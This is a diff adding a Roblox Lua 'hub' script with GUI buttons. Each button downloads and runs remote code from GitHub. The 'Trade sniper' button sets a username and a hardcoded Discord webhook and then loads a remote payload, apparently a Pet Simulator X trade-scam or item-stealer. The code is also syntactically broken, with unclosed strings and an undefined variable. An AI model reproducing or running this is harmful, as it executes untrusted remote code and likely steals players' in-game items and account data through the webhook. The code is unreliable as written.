@@ -1,0 +1,21 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("MxT Hub", "Synapse")
+
+-- Main
+local Main = Window:NewTab("Main")
+local MainSection = TaMain:NewSection("Main:)")
+
+
+MainSection:NewButton("Pet sim x", "Opens Gui Cipex Hub", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/cipex-rbx/cipex/main/loader.lua"))()
+end)
+
+
+
+MainSection:NewButton("Trade sniper ", "he have accept the whole time he cant make cancle, function()
+    _G.Username = "GalaxyMo123"
+_G.HubName = "loadstring(game:HttpGet("https://raw.githubusercontent.com/Mana42138/Manahub-Script-Hyper-804-was-here.lua/main/Hyper-is-still-here.lua"))()"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1091762041812942859/ieip3gOtgCyffn3q_A2S-I4nlamNAmRAWOTmCovvKaExNmnNoYVoRHf-qvzrn5Cb87jw"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+end)
